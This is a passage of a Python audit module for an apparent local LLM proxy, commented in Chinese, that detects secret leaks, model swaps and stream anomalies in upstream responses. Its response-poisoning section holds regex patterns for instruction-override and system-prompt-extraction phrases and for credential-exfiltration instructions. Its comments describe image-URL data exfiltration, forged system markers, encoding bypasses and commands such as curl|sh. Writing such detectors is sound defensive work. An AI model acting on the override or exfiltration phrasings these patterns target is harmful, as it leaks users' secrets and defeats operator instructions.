"""LLM Shield 2.0 审计信号检测函数。

纯函数：输入响应文本/JSON/状态码，输出信号列表。
约束（硬性，单测守死）：
- 永不修改入参（body/flow 都只读）
- 永不抛异常（检测失败返回空列表，不污染流量）
- 永不导入 mitmproxy（纯 stdlib，可单测）
- 永不写库（只返回结构化结果，由调用方决定是否记库）

信号移植自 api-relay-audit 源码（纯 stdlib 实现），按 mitmproxy 反向代理场景裁剪。
"""
# 数据面具 Maskit — 本地 LLM 敏感信息脱敏代理
# Copyright (C) 2026 TMW
#
# 本程序是自由软件：你可以依据自由软件基金会发布的 GNU Affero 通用公共许可证
# （版本 3）条款重新分发和/或修改它。
# 本程序基于「希望有用」的目的分发，但不附带任何担保；亦无对适销性或特定用途
# 适用性的默示担保。详见 GNU Affero 通用公共许可证。
# 你应已随本程序收到一份 GNU AGPL 副本；若无，见 <https://www.gnu.org/licenses/>。
import base64
import functools
import hashlib
import math
import re
from urllib.parse import urlsplit

# 共享常量（纯 stdlib 模块，不引入 mitmproxy）：分档标记同时被 event_store 的
# 读侧降噪谓词引用（`[疑似真实凭据]` 是真阳性的保护标记），必须单一定义源。
from credential_labels import (
    CREDENTIAL_ECHO_REAL_MARKER,
    CREDENTIAL_ECHO_SAMPLE_MARKER,
)

# ========== 严重度 ==========
CRITICAL = "CRITICAL"
HIGH = "HIGH"
MEDIUM = "MEDIUM"
LOW = "LOW"
_SEVERITY_ORDER = {CRITICAL: 4, HIGH: 3, MEDIUM: 2, LOW: 1}


def severity_ge(a, b):
    return _SEVERITY_ORDER.get(a, 0) >= _SEVERITY_ORDER.get(b, 0)


# ========== S1 error_leak：错误响应泄漏 ==========
# 移植自 error_leakage.py:120-130
SECRET_REGEX_PATTERNS = [
    (re.compile(r"sk-[A-Za-z0-9_-]{20,}"), "openai_api_key"),
    (re.compile(r"Bearer\s+[A-Za-z0-9\-._~+/]{20,}=*"), "bearer_token"),
    (re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}"), "aws_access_key"),
    (re.compile(r"AIza[0-9A-Za-z_-]{35}"), "google_api_key"),
    (re.compile(r"[?&]key=[A-Za-z0-9_\-]{25,}"), "google_key_url_param"),
    (re.compile(r"ya29\.[A-Za-z0-9_.~+/\-]{20,}"), "gcp_oauth_token"),
    (re.compile(r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*"), "jwt_token"),
    # ⚠️ 绝不能写成 `-----BEGIN…[\s\S]*?-----END…`（审计 M1）。没有 END 时惰性量词
    # 会从**每一个** BEGIN 位置一路尝试到字符串末尾，实测 1.5/3/6.1/12.1KB 耗时
    # 4.4/43/502/3425 ms（每翻倍 ×10，典型 O(n²)）。而 `scan_error_leak` 拿的是
    # 全量 body：上游回一个 4xx + 几百 KB 的畸形页就能把 mitmproxy 事件循环 CPU 打满。
    # 只认 PEM **头**即可 —— evidence 本来也只取前 80 字符，而「私钥头出现在响应里」
    # 本身就是确凿的泄漏信号（被截断的错误页里 END 往往已经丢了，旧写法反而漏报）。
    # `[A-Z \-]{0,40}` 的定长上界保证整体线性。
    (re.compile(r"-----BEGIN[A-Z \-]{0,40}PRIVATE KEY-----"), "pem_private_key"),
    (re.compile(r"(?<=://)[^\s'\"]*:[^\s'\"@]+(?=@)"), "db_connstring_password"),
]

# 上游域名检测已整体移除（2026-08-18）：上游地址是用户已配置并正在请求的目标，
# 错误页出现它不构成面向客户端的信息泄露，只会把审计中心灌满上游故障噪音
# （实测生产库 170 条错误响应 32 条命中，多为 CF 524 页里的 zone）。常量保留仅为
# 兼容旧调用签名，不再产生 findings。
DEFAULT_UPSTREAM_HOSTS = ()

# 凭据类环境变量：认**形状**不认名字。
# `<大写标识>_(KEY|TOKEN|SECRET|PASSWORD…)` 后面跟 = 或 : 就是凭据赋值，
# 不需要预先知道是 OPENAI_API_KEY 还是某个没听过的新厂商。
_ENV_CRED_RE = re.compile(
    r"\b[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)*_"
    r"(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|CREDENTIALS)\b\s*[=:]"
)

# 任务 #24（凭据检测形状+熵）：形状命中后还要校验**值的熵**——
# `FOO_KEY=12345` 这类低熵假值/示例值不是凭据，报了就是误报；
# `FOO_KEY=<高熵串>` 才是真实凭据。形状收窄了名字面，熵收窄了值面，两层叠加。
# 阈值参考 gitleaks/trufflehog 的通行做法：长度 >= 20 且 Shannon 熵（base 2）> 3.0。
# 注意：**只用于审计侧**（error_leak 的 env_var 信号）；脱敏主链路的前缀表
# （transparent.py DEFAULT_SECRET_PREFIXES）不上熵——那里误报 = 破坏用户请求。
_ENV_VALUE_MIN_LEN = 20
_ENV_VALUE_MIN_ENTROPY = 3.0
# 连续有序序列（字母表/数字顺逆序）是示例值惯用形态，熵判不出来（分布均匀），
# 显式排除：`abcdefghijklmnopqrstuvwxyz` / `zyxw...` / `1234567890` 不算凭据。
_ORDERED_SEQS = [
    "abcdefghijklmnopqrstuvwxyz",
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "0123456789",
]


def _is_ordered_seq(value):
    low = value.lower()
    return any(low in seq or low in seq[::-1] for seq in _ORDERED_SEQS)


def _value_entropy(value):
    """Shannon 熵（base 2，bit/char）。空串返回 0。"""
    if not value:
        return 0.0
    n = len(value)
    freqs = [value.count(ch) / n for ch in set(value)]
    return -sum(p * math.log2(p) for p in freqs if p > 0)

# 用户主目录路径：这三种是 **操作系统定义**的布局（POSIX /home、macOS /Users、
# Windows %SystemDrive%\Users），不是我猜的目录名。泄漏它等于泄漏服务器用户名。
# 原来还列了 /var/www//opt//app/ 等——那些是部署习惯不是规范，且 `/v1/chat/completions`
# 这类 API 路径同样是多段绝对路径，按「绝对路径形状」判会大量误报，所以只认主目录。
# Windows 段大小写不敏感（NTFS 路径不分大小写，`c:\users\foo` 同样泄漏用户名）：
# 内联 (?i:users) 只作用于该段；/home/、/Users/ 保持原样（惯例输出固定大小写）。
_HOME_PATH_RE = re.compile(r"(?:/home/|/Users/|[A-Za-z]:\\(?i:users)\\)[^\s/\\\"']{1,64}")

# 堆栈帧：认**帧格式**不认语言。三种形状覆盖绝大多数运行时，
# 而且新语言只要用同样的帧格式就自动覆盖：
#   Python  File "xxx.py", line 12
#   JS/Java at Foo.bar (file.js:12:5) / at com.x.Y.z(Y.java:12)
#   Go      goroutine 1 [running]:
_STACK_FRAME_RE = re.compile(
    r"File\s+\"[^\"\n]+\",\s*line\s+\d+"
    r"|\bat\s+[\w$.<>/\\-]+\s*\([^)\n]*:\d+(?::\d+)?\)"
    r"|\bgoroutine\s+\d+\s*\["
)

# 已删除的枚举表（审计信号靠结构特征识别，不硬编码网关内部字段名）：
#   LITELLM_INTERNAL_MARKERS / PII_ECHO_MARKERS —— 单个网关的内部字段名枚举，
#   换不成形状也代表不了别的网关。它们真正要防的「错误体里带出敏感内容」
#   已由上面的凭据/域名/主目录规则覆盖，留着只是徒增一张永远补不完的表。

# 自身探针标记（主动探针注入的假 secret，命中自身不算泄漏）。
# 这不是猜测——串是我们自己造并注入的，属于自指常量。
_SELF_PROBE_MARKERS = ["fake-token", "xapi-probe", "nothing-real", "auth-probe"]


def _is_self_probe(text_snippet):
    low = text_snippet.lower()
    return any(m in low for m in _SELF_PROBE_MARKERS)


# 凭据证据清洗（审计 P0-2）：evidence 会落 SQLite 和 Markdown 报告，
# 凭据原文必须抹掉，只留类型 + 掩码 + 长度。
def _redact_evidence(snippet, kind):
    """凭据证据 → 只留类型 + 长度 + 不可逆摘要（审计：凭据任何片段都不落日志）。

    曾保留 sk-AAA****WXYZ 首尾片段——若规则是"凭据任何片段都不落日志"，
    首尾字符同样是凭据素材。证据统一收敛为：
        openai_api_key len=29 sha256=abcd1234ef567890
    保留前缀种类字符（sk- 等）不算泄漏（它来自正则匹配的固定前缀）。
    """
    if not snippet:
        return ""
    try:
        digest = hashlib.sha256(snippet.encode("utf-8")).hexdigest()[:16]
    except Exception:
        digest = "?"
    return f"{kind} len={len(snippet)} sha256={digest}"


def scan_error_leak(status_code, body_text, headers_text="", upstream_hosts=None):
    """S1 错误响应泄漏扫描。

    触发条件：status_code >= 400。
    返回 [{signal, severity, evidence, kind}]。evidence 中的凭据已掩码。

    Args:
        upstream_hosts: 已废弃（仅兼容旧调用签名）。上游域名检测已移除——
            上游地址是用户自己配置并正在请求的目标，错误页出现它不构成
            面向客户端的信息泄露，只会制造审计噪音；传入后不再产生 findings。
    """
    if status_code is None:
        return []
    try:
        sc = int(status_code)
    except (TypeError, ValueError):
        return []
    if sc < 400:
        return []
    results = []
    hay = f"{body_text or ''}\n{headers_text or ''}"
    if not hay.strip():
        return []

    # secret 正则
    for rx, kind in SECRET_REGEX_PATTERNS:
        for m in rx.finditer(hay):
            snippet = m.group()[:80]
            if _is_self_probe(snippet):
                continue
            sev = CRITICAL if kind in ("openai_api_key", "bearer_token", "aws_access_key", "pem_private_key") else HIGH
            results.append({
                "signal": "error_leak",
                "severity": sev,
                "evidence": f"{kind}: {_redact_evidence(snippet, kind)}",
                "kind": kind,
            })

    # 上游域名检测已移除（2026-08-18）：上游地址是用户自己配置并正在请求的
    # 目标，错误页出现它不构成信息泄露，只会制造审计噪音；排障走主事件日志。

    # 以下三条一律按**形状**判定，不列具体名字（见各常量注释）。
    # env_var 附加**值熵**校验（任务 #24）：`_KEY=12345` 低熵不算凭据，
    # 避免把示例/假值当泄漏报。取 =/: 后到空白/引号/逗号前的值。
    for m in _ENV_CRED_RE.finditer(hay):
        val = hay[m.end():]
        vm = re.match(r"[^\s'\"`,;\]}]+|$", val)
        val = vm.group(0) if vm else ""
        if len(val) < _ENV_VALUE_MIN_LEN or _value_entropy(val) < _ENV_VALUE_MIN_ENTROPY or _is_ordered_seq(val):
            continue
        results.append({"signal": "error_leak", "severity": HIGH,
                        "evidence": f"env_var: {m.group()[:60]}", "kind": "env_var"})
    # fs_path / stack_trace：结构上确实泄漏了服务器用户名/内部路径，但价值低、
    # 误报高（讨论/文档/错误示例都长这样），降为 LOW——默认 severity_floor=MEDIUM
    # 不写 audit_events，仅用户主动降门槛做排障诊断时可见（2026-08-18）。
    for m in _HOME_PATH_RE.finditer(hay):
        results.append({"signal": "error_leak", "severity": LOW,
                        "evidence": f"fs_path: {m.group()[:60]}", "kind": "fs_path"})
    for m in _STACK_FRAME_RE.finditer(hay):
        results.append({"signal": "error_leak", "severity": LOW,
                        "evidence": f"stack_trace: {m.group()[:60]}", "kind": "stack_trace"})

    return dedupe_findings(results)


# ========== S2 identity_swap：模型替换（对比式，零硬编码） ==========
# 借鉴 LiteLLM 的 requested_model vs response_model 对比方案：
# 请求 model（客户端指定）是基准真相，响应 model 与之家族级对比——
# 不一致才是换芯。不识别任何模型名/厂商，模型迭代、新厂商自动适配，永不失效。


def _model_family(model):
    """提取模型家族前缀（对比用）：claude-sonnet-4 -> claude；gpt-4o -> gpt。

    对比时忽略具体版本，避免别名误报（claude-sonnet-4 vs claude-3.5-sonnet
    都是 claude 家族，不算换芯）。零知识库——只取第一个字母段，不识别任何厂商。
    """
    m = str(model or "").strip().lower()
    if not m:
        return ""
    # 去掉常见前缀（openai/ anthropic/ 等路由前缀，如 anthropic/claude-3-5-sonnet）
    if "/" in m:
        m = m.split("/")[-1]
    # 取首个纯字母段：claude-sonnet-4 -> claude；gpt-4o -> gpt；deepseek-v3 -> deepseek
    seg = re.match(r"[a-z][a-z0-9]*", m)
    return seg.group(0) if seg else ""


def _families_match(a, b):
    """两个模型家族是否一致（空值/未知都算一致——不做无根据的断言）。"""
    fa, fb = _model_family(a), _model_family(b)
    if not fa or not fb:
        return True  # 任一侧未知 → 无法判断，不报
    return fa == fb


# 同家族「档位词」表：这些词说的是**能力档位**（通用命名，不是厂商/型号枚举），
# 用于在家族相同时识别「偷偷换档」——`gpt-4o -> gpt-4o-mini`、
# `claude-opus -> claude-haiku` 家族都一样，只差档位词。
#
# 为什么只比档位词、不比版本号：`claude-sonnet-4` 与 `claude-3.5-sonnet` 这类版本
# 别名在同家族的合法行为里大量存在（单测 test_identity_swap_model_same_family_no_hit
# 锁的就是它），按版本号比会持续误报。档位词是能力语义而非版本号，才具备可判性。
_MODEL_TIER_LOW = frozenset({
    "nano", "mini", "small", "lite", "light", "tiny", "flash", "haiku", "instant", "fast", "chat",
})
_MODEL_TIER_HIGH = frozenset({
    "pro", "max", "ultra", "opus", "sonnet", "large", "plus", "advanced", "reasoning", "thinking",
})
_MODEL_TIER_WORDS = _MODEL_TIER_LOW | _MODEL_TIER_HIGH


def _model_tier_words(model):
    """提取模型名里的能力档位词集合（`gpt-4o-mini` -> {'mini'}）。"""
    m = str(model or "").strip().lower()
    if not m:
        return frozenset()
    if "/" in m:
        m = m.split("/")[-1]
    return frozenset(w for w in re.split(r"[^a-z0-9]+", m) if w in _MODEL_TIER_WORDS)


def _tier_suffix(tiers):
    """证据里的档位词后缀：`gpt-4o` 这类无档位词的显式写成 [none]，避免看着像漏了。"""
    return " [%s]" % ",".join(sorted(tiers)) if tiers else " [none]"


def scan_identity_swap(text, model_field=None, req_model=None):
    """S2 模型替换扫描（对比式，零硬编码）。

    只比较请求 model（客户端指定，基准真相）与响应 model 字段（模型自报信息）：
    家族不一致（换壳）记 HIGH；家族一致但档位词不同（换档，如 gpt-4o -> gpt-4o-mini）
    记 MEDIUM（换档是「偷偷降级」，家族级对比天生看不见）。删除「我是/I am」等
    自然语言身份句式判定：角色扮演、用户要求复述或 relay 文案都可能触发，
    不能作为换芯证据。

    Args:
        text: 保留参数以兼容现有调用；不再用自然语言文本做身份判定。
        model_field: SSE message_start.message.model 或 JSON model 字段。
        req_model: 请求 body 的 model 字段（基准真相）。

    返回 [{signal, severity, evidence, kind}]。
    """
    results = []

    # 1) 主检测：响应 model vs 请求 model（家族级对比）
    if model_field is not None and isinstance(model_field, str) and model_field.strip():
        if req_model and not _families_match(req_model, model_field):
            results.append({
                "signal": "identity_swap",
                "severity": HIGH,
                "evidence": f"model_mismatch: req={req_model[:60]} resp={model_field[:60]}",
                "kind": "model_mismatch",
            })

    # 2) 同家族换档检测：家族一致但能力档位词不同。
    #    为什么必须单独一档：家族级对比对 `gpt-4o -> gpt-4o-mini` 必然零告警，
    #    而「偷偷降档」正是最隐蔽的一类换芯（用户按贵档付费、拿到便宜档输出）。
    #    版本号差异仍然不报（同家族版本别名是合法常态，见 docstring）。
    if model_field is not None and isinstance(model_field, str) and model_field.strip() and req_model:
        fam_req, fam_resp = _model_family(req_model), _model_family(model_field)
        if fam_req and fam_req == fam_resp:
            tiers_req, tiers_resp = _model_tier_words(req_model), _model_tier_words(model_field)
            if tiers_req != tiers_resp:
                results.append({
                    "signal": "identity_swap",
                    "severity": MEDIUM,
                    "evidence": (
                        f"model_tier_mismatch: req={req_model[:60]}{_tier_suffix(tiers_req)} "
                        f"resp={model_field[:60]}{_tier_suffix(tiers_resp)}"
                    ),
                    "kind": "model_tier_mismatch",
                })

    return results


# ========== S3 tool_call_rewrite：工具调用重写 ==========
# 移植自 tool_substitution.py:26-72
PINNED_PACKAGES = [
    ("pip", "pip install requests==2.31.0"),
    ("npm", "npm install lodash@4.17.21"),
    ("cargo", "cargo add serde"),
    ("go", "go get github.com/stretchr/testify"),
]

_WRAPPER_RE = re.compile(r"^[\s>#$`\"']+|[\s`\"']+$")
_FENCE_RE = re.compile(r"^```[a-zA-Z]*\n|```$")


def _strip_wrappers(text):
    s = text.strip()
    # 去 ```fence```
    if s.startswith("```"):
        s = _FENCE_RE.sub("", s)
    # 去首尾引号/反引号/前缀
    s = _WRAPPER_RE.sub("", s)
    return s.strip()


def classify_tool_echo(expected, actual):
    """比对模型回显与 expected。

    返回 'exact' / 'whitespace' / 'substituted'。
    """
    e = _strip_wrappers(expected)
    a = _strip_wrappers(actual)
    if e == a:
        return "exact"
    if e.split() == a.split() or e.lower() == a.lower():
        return "whitespace"
    return "substituted"


def scan_tool_call_rewrite(expected, actual):
    """S3 工具调用重写检测。

    仅主动探针模式用：发 pinned package 命令要求逐字复读，比对回显。
    返回 [{signal, severity, evidence, kind}]。
    """
    if not expected or not actual:
        return []
    verdict = classify_tool_echo(expected, actual)
    if verdict == "exact":
        return []
    sev = LOW if verdict == "whitespace" else MEDIUM
    return [{
        "signal": "tool_call_rewrite",
        "severity": sev,
        "evidence": f"expected='{expected[:40]}' actual='{actual[:40]}' verdict={verdict}",
        "kind": "tool_echo",
    }]


# ========== S4 sse_anomaly：流异常 ==========
# 移植自 stream_integrity.py
KNOWN_SSE_EVENT_TYPES = {
    "ping", "message_start", "content_block_start", "content_block_delta",
    "content_block_stop", "message_delta", "message_stop",
}
# OpenAI 格式兼容（无显式事件类型，靠 data 字段判断）
_OPENAI_SSE_KEYS = {"choices", "delta", "usage", "system_fingerprint"}


def scan_sse_anomaly(events):
    """S4 SSE 流异常检测。

    events: 解析后的事件列表，每项 {type, data(dict或None)}。
    返回 [{signal, severity, evidence, kind}]。
    """
    if not events:
        return []
    results = []
    unknown = []
    output_tokens_samples = []
    input_tokens_first = None
    input_tokens_samples = []
    empty_signature_count = 0
    stream_model = None

    for ev in events:
        etype = ev.get("type")
        data = ev.get("data") or {}

        # 事件类型白名单（Claude）
        if etype and etype not in KNOWN_SSE_EVENT_TYPES:
            # OpenAI 格式无 type，靠 data key 兼容
            if not any(k in data for k in _OPENAI_SSE_KEYS):
                unknown.append(etype)

        if etype == "message_start":
            msg = data.get("message") or {}
            stream_model = msg.get("model") or data.get("model")
            usage = msg.get("usage") or data.get("usage") or {}
            if "input_tokens" in usage:
                input_tokens_first = usage.get("input_tokens")
        elif etype == "message_delta":
            usage = data.get("usage") or {}
            if "output_tokens" in usage:
                output_tokens_samples.append(usage.get("output_tokens"))
            if "input_tokens" in usage:
                input_tokens_samples.append(usage.get("input_tokens"))
            # thinking signature
            if "signature_delta" in data:
                sig = data.get("signature_delta")
                if not sig or (isinstance(sig, str) and not sig.strip()):
                    empty_signature_count += 1

    # unknown 事件
    for ut in unknown[:6]:
        results.append({"signal": "sse_anomaly", "severity": LOW, "evidence": f"unknown_event: {ut[:40]}", "kind": "unknown_event"})

    # stream model：不在此处硬编码校验模型名（曾假设流式必须 claude，
    # 但产品支持多上游，gpt-4o/deepseek 流式会被误报 HIGH）。
    # 模型一致性由 S2 identity_swap 对比式检测负责（请求 model vs 响应 model）。

    # usage 单调性：真实 SSE 多次 usage 采样可能非单调（上游分片/采样抖动），
    # 属兼容性观察不是安全信号，恒 LOW（2026-08-18）。
    for i in range(1, len(output_tokens_samples)):
        if output_tokens_samples[i] < output_tokens_samples[i - 1]:
            results.append({
                "signal": "sse_anomaly",
                "severity": LOW,
                "evidence": f"output_tokens_regress: {output_tokens_samples[i-1]} -> {output_tokens_samples[i]}",
                "kind": "usage_regress",
            })
            break

    # usage 一致性
    if input_tokens_first is not None and input_tokens_samples:
        if any(s != input_tokens_first for s in input_tokens_samples):
            results.append({
                "signal": "sse_anomaly",
                "severity": LOW,
                "evidence": f"input_tokens_inconsistent: first={input_tokens_first} samples={input_tokens_samples[:5]}",
                "kind": "usage_inconsistent",
            })

    # 空 thinking signature：无 thinking 模型也可能发空，兼容性观察，恒 LOW。
    if empty_signature_count > 0:
        results.append({
            "signal": "sse_anomaly",
            "severity": LOW,
            "evidence": f"empty_signature_delta: {empty_signature_count}",
            "kind": "empty_signature",
        })

    return results


# ========== S6 response_poison：响应投毒 ==========
# 隐藏 Unicode
# 隐藏 Unicode 分两档——一刀切报 HIGH 是纯噪声源（实测生产库里
# hidden_unicode 全是 U+FEFF count=1，无一真投毒）。
#
# 高危档：双向覆盖/隔离符。正常 API 响应里没有任何合法用途，
# 它们能让 "safe.txt" 显示成 "txt.efas"，是文本欺骗的标准手法，出现即可疑。
_HIDDEN_UNICODE_HIGH = re.compile(r"[‪-‮⁦-⁩]")
# 低危档：零宽字符与 BOM。**这些天天自然出现**——U+200D 是 emoji 组合符
# （👨‍👩‍👧 就靠它拼），U+FEFF 是 BOM，U+200B 在中文排版里也常见。
# 只有成规模出现才可能是编码载荷，单个出现必须闭嘴。
_HIDDEN_UNICODE_LOW = re.compile(r"[​-‍﻿]")
# 阈值 8：手工排版不会连着塞 8 个零宽字符，而用零宽字符编码一个字节
# 至少要 8 个（每字符 1 bit）。低于这个数报出来只会淹没真信号。
_HIDDEN_LOW_THRESHOLD = 8

# shell 命令检测**不在这里**——已整体交给 S9 scan_dangerous_action。
#
# 原来 S6 有一条 _SHELL_INJECTION_RE（rm -rf / curl|sh / npm i -g），实测生产库里
# 它产出的 19 条记录**全部是误报**：编程助手讨论构建步骤时提到 `rm -rf resources/engine`
# 就报 HIGH。而它认的形态 S9 已经全覆盖，且 S9 更准：
#   - `rm -rf <某个目录>` 是日常操作，S9 只认删根/家目录/盘符（CRITICAL）
#   - `curl|sh` S9 有 remote_exec，还带讲解语境降级和 kind 去重
# 两套规则叠加只是把同一件事报两遍，删掉 S6 这条不丢任何检测能力。

# 自动拉取型 URL：Markdown 图片与 HTML img/iframe/script 的 src。
# 这类 URL 在客户端渲染时**无需用户点击**就会被发出去，是 LLM 数据外泄的标准手法：
# 把窃取到的内容编码进 query，用户一看到回复数据就已经外发了。
#
# 关键：只有**带数据载荷的 query** 才算。上一版按可疑 TLD（.top/.xyz/.work…）判定，
# 生产库里 12 条 callback_url 全是模型在正常讲解 `https://anyrouter.top/v1` 这个
# 网关地址——TLD 启发式在 2020 年后已经没有区分度，纯噪声。
_AUTOFETCH_URL_RE = re.compile(
    r"!\[[^\]]{0,200}\]\(\s*(https?://[^\s)]+)"
    r"|<(?:img|iframe|script)\b[^>]{0,300}?\bsrc\s*=\s*[\"']?(https?://[^\s\"'>]+)",
    re.I,
)
# query 里挂着长编码串 = 正在往外带数据。正常图片 URL（CDN、图表、logo）不长这样。
_EXFIL_PAYLOAD_RE = re.compile(r"[?&][\w.\-]{1,24}=([A-Za-z0-9+/%_\-]{24,})")

# ========== S6 扩展：提示词注入 / 系统提示词索要 / 凭据外发指令（2026-09-19） ==========
# 与 S9 同一条纪律：只认**结构槽位**（动词 + 宾语 + 目标），不判「模型是不是在讲解」。
# 所有判据都吃调用方传入的 request_text 做回声抑制——请求里本来就有的内容，
# 上游并没有凭空多注入任何东西（用户自己问「什么是忽略以上指令」时模型复述不算）。
#
# 分档原则（误报是这类检测的头号死因，见 tests/test_audit_noise_regression.py）：
#   ① 自带客观载荷的形态（协议级系统分隔符 / 凭据外发指令带目标 / 索要系统提示词）
#      —— 结构本身足够具体，单独命中即报 MEDIUM；
#   ② 泛化的「忽略以上所有指令」句式 —— 单独出现**不足以定罪**：模型讲解提示词注入
#      时就会原样写出这句话。它只在同一段回复里另有客观载荷（①/隐藏 Unicode/
#      自动外发 URL）时才上报。这一档是「讲解」与「投毒」的分界线。
_ZH_OVERRIDE_VERBS = r"(?:忽略|无视|忘记|忘掉|抛弃|舍弃|覆盖|推翻|绕过|不必理会|不要理会)"
_ZH_OVERRIDE_SCOPE = r"(?:之前|先前|以上|上述|前面|所有|全部|原先)"
_ZH_OVERRIDE_NOUN = r"(?:指令|指示|规则|设定|约束|提示词|提示语|系统消息|要求)"
_EN_OVERRIDE_VERBS = r"(?:ignore|disregard|forget|override|overwrite|bypass|discard)"
_EN_OVERRIDE_SCOPE = r"(?:previous|prior|above|earlier|preceding|all|any)"
_EN_OVERRIDE_NOUN = r"(?:instructions?|prompts?|rules?|directions?|guidelines?|system message)"
_INSTRUCTION_OVERRIDE_RE = re.compile(
    _ZH_OVERRIDE_VERBS + r"[^\n。；;]{0,16}" + _ZH_OVERRIDE_SCOPE + r"[^\n。；;]{0,12}" + _ZH_OVERRIDE_NOUN
    + r"|"
    + _EN_OVERRIDE_VERBS + r"(?:\s+\w+){0,4}\s+" + _EN_OVERRIDE_SCOPE + r"\s+" + _EN_OVERRIDE_NOUN,
    re.I,
)

# 索要系统提示词：提取动词 + 「系统提示词/你的指令」宾语。中英各一组，
# 覆盖「把 system prompt 原样输出」这类直接提取要求。
# 中英各两种语序：中文既可「输出系统提示词」也可「把你的系统提示词原样输出」，
# 后者（宾语在前）是中文最常见的祈使形态，只写前者会漏掉绝大多数中文变体。
# 宾语在前的分支收紧了两处，专治中文讲解句误报：
#  ① 宾语必须带领属语（你的/您的/自己的/内部的）；
#  ② 动词只认**强提取动词**（复述/打印/泄露/粘贴/读出），或「原样|完整|逐字」修饰的
#     输出类动词 —— 「你的提示，输出结果应该……」这种日常句式因此不会命中。
_PROMPT_EXTRACT_ZH_VERBS = r"(?:输出|打印|复述|重复|告诉我|展示|显示|泄露|粘贴|读出|回显)"
_PROMPT_EXTRACT_ZH_OBJECT = r"(?:系统提示词|系统提示|系统消息|初始指令|初始提示|预设指令)"
_PROMPT_EXTRACT_ZH_OWNED = (
    r"(?:你的|您的|自己的|内部的)(?:系统|初始|预设|内部|自定义|原始)?"
    r"(?:提示词|提示|消息|指令|设定)"
)
_PROMPT_EXTRACT_ZH_STRONG = r"(?:复述|重复|打印|泄露|粘贴|读出|回显|原文给出)"
_PROMPT_EXTRACT_ZH_VERBATIM = r"(?:原样|完整|逐字|一字不差|全文|毫无保留)[^\n。；;]{0,4}?(?:输出|显示|给出|告诉我)"
_PROMPT_EXTRACT_RE = re.compile(
    _PROMPT_EXTRACT_ZH_VERBS + r"[^\n。；;]{0,16}?" + _PROMPT_EXTRACT_ZH_OBJECT
    + r"|" + _PROMPT_EXTRACT_ZH_OWNED + r"[^\n。；;]{0,10}?"
    + r"(?:" + _PROMPT_EXTRACT_ZH_STRONG + r"|" + _PROMPT_EXTRACT_ZH_VERBATIM + r")"
    + r"|"
    + r"(?:repeat|print|output|show|reveal|disclose|paste|echo)(?:\s+\w+){0,4}\s+(?:your|the)\s+"
    + r"(?:system\s+)?(?:prompt|instructions?|initial instructions?|system message)",
    re.I,
)

# 凭据外发指令：凭据词 + 外发动词 + **外部目标**。
# 目标只认 URL（带 scheme）与邮箱 —— 这两者不可能是「把 key 存进本地配置」的合法建议，
# 因此误报面极小；不列 TLD 枚举（避免重蹈「可疑 TLD」那版噪声）。
_CRED_NOUN_RE = (
    r"(?:api[\s_\-]?key|apikey|access[\s_\-]?key|secret[\s_\-]?key|secret|token|"
    r"密钥|私钥|密码|口令|凭据|凭证|credential|环境变量|\.env\b)"
)
_ZH_EXFIL_VERB_RE = r"(?:发送|发给|上传|提交|粘贴|填入|回传|转发|传给|发往|泄漏给|暴露给)"
_EN_EXFIL_VERB_RE = r"(?:send|upload|submit|paste|post|forward|transmit|exfiltrate|share)"
_EXFIL_TARGET_RE = r"(?:https?://|@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})"
_CREDENTIAL_EXFIL_RE = re.compile(
    _CRED_NOUN_RE + r"[^\n。；;]{0,24}?" + _ZH_EXFIL_VERB_RE + r"[^\n。；;]{0,16}?" + _EXFIL_TARGET_RE
    + r"|" + _CRED_NOUN_RE + r"[^\n。；;]{0,24}?" + _EN_EXFIL_VERB_RE + r"[^\n。；;]{0,16}?" + _EXFIL_TARGET_RE
    + r"|" + _EN_EXFIL_VERB_RE + r"(?:\s+\w+){0,3}\s+" + _CRED_NOUN_RE + r"[\s\S]{0,24}?" + _EXFIL_TARGET_RE,
    re.I,
)

# 协议级系统分隔符：注入者用真实对话模板的标记伪造「系统轮次」。
# 两种形态分开判，是为了不误伤「模型在讲解这些标记」：
#  - 分隔符标记（<|im_start|> / [INST] / <<SYS>>）：伪造一个系统轮次**至少要两个**
#    （开 + 闭/换角色），而讲解时通常只引用一个 → 要求同一条回复里出现 **>=2 个**才报。
#  - Markdown 伪系统标题（`### System:`）：单次出现即有可能，但必须**不在 code block 里**
#    （code block 里的是被引用的格式说明，不是正文指令）。
_FAKE_SYSTEM_MARKER_RE = re.compile(
    r"<\|(?:im_start|im_end|start_header_id|end_header_id|system|assistant|user)\|>"
    r"|\[\/?INST\]|<<\/?SYS>>",
    re.I,
)
_FAKE_SYSTEM_HEADING_RE = re.compile(
    r"^\s{0,3}#{2,4}\s*(?:system|instruction|系统提示|系统指令)\s*[:：]",
    re.I | re.M,
)

# 编码绕过：base64 / \uXXXX / HTML 实体。只在直接扫描零命中时对解码结果再扫一遍
# （见 scan_response_poison 末尾），避免给普通代码回复增加无谓开销与重复告警。
_B64_RUN_RE = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")
_UNICODE_ESC_RUN_RE = re.compile(r"(?:\\u[0-9a-fA-F]{4}){3,}")
_HTML_ENTITY_RUN_RE = re.compile(r"(?:&#[0-9]{2,7};|&#x[0-9a-fA-F]{2,6};){3,}")
_DECODE_MAX_CANDIDATES = 32
_DECODE_CONTEXT_CHARS = 120


def _decode_candidates(text):
    """抽出文本里可解码的编码片段并解码（base64 / \\uXXXX / HTML 实体）。

    纯函数、永不抛异常：任何解码失败都跳过该片段。只返回**全可打印**的解码结果，
    二进制垃圾不进入二次扫描。
    """
    out = []
    if not text:
        return out
    try:
        count = 0
        for m in _B64_RUN_RE.finditer(text):
            if count >= _DECODE_MAX_CANDIDATES:
                break
            count += 1
            chunk = m.group(0)
            if len(chunk) > 4096:
                continue
            try:
                raw = base64.b64decode(chunk + "=" * (-len(chunk) % 4), validate=True)
                decoded = raw.decode("utf-8")
            except Exception:
                continue
            if decoded and all(ch.isprintable() or ch in "\n\r\t" for ch in decoded):
                out.append(decoded)
        # 转义/实体只覆盖片段时，攻击话术往往一半转义一半明文
        # （`\u0069gnore previous instructions`）——只把解码片段丢掉上下文会漏判，
        # 所以连**前后各 120 字符窗口**一起拼成候选文本再扫。
        for m in _UNICODE_ESC_RUN_RE.finditer(text):
            if len(out) >= _DECODE_MAX_CANDIDATES * 2:
                break
            try:
